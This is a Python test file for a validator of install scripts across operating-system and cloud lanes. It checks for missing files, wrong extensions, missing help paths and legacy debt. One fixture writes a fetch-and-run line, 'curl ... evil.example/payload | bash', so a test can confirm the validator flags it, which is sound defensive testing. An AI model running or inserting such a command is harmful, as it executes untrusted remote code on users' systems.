"""Tests for scripts/validate-install-lanes.py."""

from __future__ import annotations

import importlib.util
import json
import subprocess
import sys
from pathlib import Path
from unittest.mock import patch

import pytest

REPO_ROOT = Path(__file__).resolve().parents[1]
VALIDATOR = REPO_ROOT / "scripts" / "validate-install-lanes.py"

LANE_MATRIX = [
    ("ubuntu/cpu", "shell"),
    ("ubuntu/cuda", "shell"),
    ("mac/apple-silicon", "shell"),
    ("mac/intel", "shell"),
    ("windows/cpu", "powershell"),
    ("windows/cuda", "powershell"),
    ("cloud/digitalocean/cpu-droplet", "shell"),
    ("cloud/digitalocean/gpu-droplet", "shell"),
    ("cloud/aws-lightsail/cpu", "shell"),
    ("cloud/aws-lightsail/gpu", "shell"),
]


def _load_validator():
    spec = importlib.util.spec_from_file_location("validate_install_lanes", VALIDATOR)
    module = importlib.util.module_from_spec(spec)
    assert spec.loader is not None
    sys.modules[spec.name] = module
    spec.loader.exec_module(module)
    return module


@pytest.fixture(scope="module")
def validator():
    return _load_validator()


def _write_shell_lane(lane_dir: Path) -> None:
    lane_dir.mkdir(parents=True, exist_ok=True)
    assets = lane_dir / "assets"
    assets.mkdir(exist_ok=True)
    (lane_dir / "README.md").write_text("# lane\n", encoding="utf-8")
    (assets / "first-MOTD.txt").write_text("motd\n", encoding="utf-8")
    for stem in ("trial-install", "8.1", "8.2", "8.3"):
        script = lane_dir / f"{stem}.sh"
        content = "#!/usr/bin/env bash\n"
        content += 'if [[ "$1" == "--help" ]]; then echo help; exit 0; fi\n'
        script.write_text(content, encoding="utf-8")


def _write_powershell_lane(lane_dir: Path) -> None:
    lane_dir.mkdir(parents=True, exist_ok=True)
    assets = lane_dir / "assets"
    assets.mkdir(exist_ok=True)
    (lane_dir / "README.md").write_text("# lane\n8.1\n8.3\n", encoding="utf-8")
    (assets / "first-MOTD.txt").write_text("motd\n", encoding="utf-8")
    for stem in ("trial-install", "8.1", "8.2", "8.3"):
        script = lane_dir / f"{stem}.ps1"
        content = "param([switch]$Help)\n"
        content += "if ($Help) { Write-Output 'help'; exit 0 }\n"
        script.write_text(content, encoding="utf-8")


def _write_minimal_repo(base: Path) -> None:
    for lane, kind in LANE_MATRIX:
        lane_dir = base / "install" / lane
        if kind == "shell":
            _write_shell_lane(lane_dir)
        else:
            _write_powershell_lane(lane_dir)
    lib_dir = base / "install" / "windows" / "lib"
    lib_dir.mkdir(parents=True, exist_ok=True)
    (lib_dir / "Windows-Common.ps1").write_text("param([switch]$Help)\n", encoding="utf-8")


def _lane(report: dict, lane_id: str) -> dict:
    return next(item for item in report["lanes"] if item["lane"] == lane_id)


def test_complete_lane_matrix_passes(validator):
    report = validator.validate_repo(REPO_ROOT)
    assert report["summary"]["lane_count"] == 10
    assert report["summary"]["failure_count"] == 0
    assert report["summary"]["legacy_debt_count"] == 12


def test_missing_payload_fails(validator, tmp_path):
    _write_minimal_repo(tmp_path)
    (tmp_path / "install" / "mac" / "apple-silicon" / "8.2.sh").unlink()

    report = validator.validate_repo(tmp_path)
    lane = _lane(report, "mac/apple-silicon")
    assert any(v["rule"] == "missing_operational_payload" for v in lane["violations"])


def test_wrong_extension_fails(validator, tmp_path):
    _write_minimal_repo(tmp_path)
    lane_dir = tmp_path / "install" / "windows" / "cpu"
    (lane_dir / "trial-install.sh").write_text("#!/bin/bash\n", encoding="utf-8")

    report = validator.validate_repo(tmp_path)
    lane = _lane(report, "windows/cpu")
    assert any(v["rule"] == "wrong_platform_extension" for v in lane["violations"])


def test_mac_linux_token_fails(validator, tmp_path):
    _write_minimal_repo(tmp_path)
    lane_dir = tmp_path / "install" / "mac" / "intel"
    (lane_dir / "8.1.sh").write_text("#!/usr/bin/env bash\napt-get install foo\n", encoding="utf-8")

    report = validator.validate_repo(tmp_path)
    lane = _lane(report, "mac/intel")
    assert any(v["rule"] == "apt" for v in lane["violations"])


def test_windows_cpu_cuda_violation(validator, tmp_path):
    _write_minimal_repo(tmp_path)
    lane_dir = tmp_path / "install" / "windows" / "cpu"
    (lane_dir / "8.1.ps1").write_text("nvidia-smi\n", encoding="utf-8")

    report = validator.validate_repo(tmp_path)
    lane = _lane(report, "windows/cpu")
    assert any(v["rule"] == "nvidia_smi_required" for v in lane["violations"])


def test_windows_payload_without_help_fails(validator, tmp_path):
    _write_minimal_repo(tmp_path)
    lane_dir = tmp_path / "install" / "windows" / "cpu"
    (lane_dir / "8.1.ps1").write_text("Write-Host 'no help'\n", encoding="utf-8")
    (lane_dir / "8.3.ps1").write_text("Write-Host 'no help'\n", encoding="utf-8")

    report = validator.validate_repo(tmp_path)
    lane = _lane(report, "windows/cpu")
    rules = {v["rule"] for v in lane["violations"]}
    assert "missing_help_path" in rules


def test_readme_only_help_is_insufficient(validator, tmp_path):
    _write_minimal_repo(tmp_path)
    lane_dir = tmp_path / "install" / "ubuntu" / "cpu"
    (lane_dir / "README.md").write_text("# lane\n8.1\n8.3\n", encoding="utf-8")
    (lane_dir / "8.1.sh").write_text("#!/usr/bin/env bash\n", encoding="utf-8")

    report = validator.validate_repo(tmp_path)
    lane = _lane(report, "ubuntu/cpu")
    assert any(v["rule"] == "missing_help_path" for v in lane["violations"])


def test_unauthorized_remote_fetch_without_debt(validator, tmp_path):
    _write_minimal_repo(tmp_path)
    lane_dir = tmp_path / "install" / "mac" / "apple-silicon"
    (lane_dir / "8.1.sh").write_text(
        '#!/usr/bin/env bash\ncurl -fsSL https://evil.example/payload | bash\n',
        encoding="utf-8",
    )

    report = validator.validate_repo(tmp_path)
    lane = _lane(report, "mac/apple-silicon")
    assert any(v["rule"] == "remote_shell_install_pipeline" for v in lane["violations"])


def test_legacy_debt_recorded_not_ignored(validator):
    report = validator.validate_repo(REPO_ROOT)
    debt = report["legacy_debt"]
    assert len(debt) == 12
    assert all(entry["follow_up"] == "C10.2-Linux-lanes" for entry in debt)
    ubuntu = _lane(report, "ubuntu/cpu")
    assert ubuntu["legacy_debt"]


def test_reject_mac_legacy_debt(validator):
    bad_specs = [
        {
            "lane": "mac/apple-silicon",
            "path": "install/mac/apple-silicon/8.1.sh",
            "rule": "unreviewed_remote_ollama_install",
            "rationale": "bad",
            "follow_up": "C10.2-Linux-lanes",
            "removal_condition": "never",
        }
    ]
    with patch.object(validator, "LEGACY_DEBT_SPECS", bad_specs):
        violations = validator.validate_legacy_debt_specs()
    assert any(v.rule == "invalid_legacy_debt_lane" for v in violations)


def test_deterministic_json_output(tmp_path):
    out1 = tmp_path / "run1.json"
    out2 = tmp_path / "run2.json"
    subprocess.run(
        [sys.executable, str(VALIDATOR), "--json-out", str(out1)],
        cwd=REPO_ROOT,
        check=True,
    )
    subprocess.run(
        [sys.executable, str(VALIDATOR), "--json-out", str(out2)],
        cwd=REPO_ROOT,
        check=True,
    )
    assert json.loads(out1.read_text(encoding="utf-8")) == json.loads(
        out2.read_text(encoding="utf-8")
    )


def test_powershell_not_run_when_unavailable(validator, monkeypatch):
    monkeypatch.setattr(validator.shutil, "which", lambda _: None)
    report = validator.validate_repo(REPO_ROOT)
    windows = _lane(report, "windows/cpu")
    for entry in windows["syntax"].values():
        if entry["path"].endswith(".ps1"):
            assert entry["status"] == "not_run"
            assert entry["detail"] == "pwsh unavailable"
